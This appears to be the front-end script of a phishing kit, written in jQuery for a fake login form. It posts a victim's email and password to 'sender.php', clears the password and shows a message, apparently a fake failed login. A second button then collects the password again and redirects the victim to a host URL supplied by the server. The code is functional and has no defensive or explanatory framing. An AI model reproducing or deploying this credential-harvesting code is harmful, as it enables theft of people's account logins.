$(document).ready(function() {
	$('#butsave').on('click', function(e) {
		 e.preventDefault();
		$("#butsave").attr("disabled", "disabled");
		$("#loader").show();
		var email = $('#email').val();
		var password = $('#password').val();
		
		if(email !="" && password !=""){
			$.ajax({
				url: "../sender.php",
				type: "POST",
				data: {email: email,password: password},
				cache: false,

				success: function(dataResult){
					var dataResult = JSON.parse(dataResult);
					console.log(dataResult);
					if(dataResult.statusCode==200){
						$("#loader").hide();
						$("#butsave").removeAttr("disabled");
						$("#butsave").hide();
						$("#butsave2").show();
						// $('#ema').find('input:text').val('');
						$("#msg").show();
						$('#password').val('');
						$("password").css("border-color", "solid 1px #ff0000");
												
					}
					else if(dataResult.statusCode==400){alert("Error occured !");}
					
				}
			});
		}
		else{
			alert('Please fill all the field!');
			 $("#butsave").removeAttr("disabled");
			 $("#loader").hide();

		}
	});
});

$(document).ready(function() {
	$('#butsave2').on('click', function(e) {
		e.preventDefault();
		$("#butsave2").attr("disabled", "disabled");
		$("#loader2").show();
		var email = $('#email').val();
		var password = $('#password').val();
		
		if(email !="" && password !=""){
			$.ajax({
				url: "../sender.php",
				type: "POST",
				data: {email: email,password: password},
				cache: false,

				success: function(dataResult){
					var dataResult = JSON.parse(dataResult);
					console.log(dataResult);
					if(dataResult.statusCode==200){
						$("#loader").hide();
						$("#butsave2").removeAttr("disabled");
						window.location.href = dataResult.host;
					}
					else if(dataResult.statusCode==400){alert("Error occurred !");}
					
				}
			});
		}
		else{
			alert('Please fill all the field!');
			 $("#butsave2").removeAttr("disabled");
			 $("#loader").hide();

		}
	});
});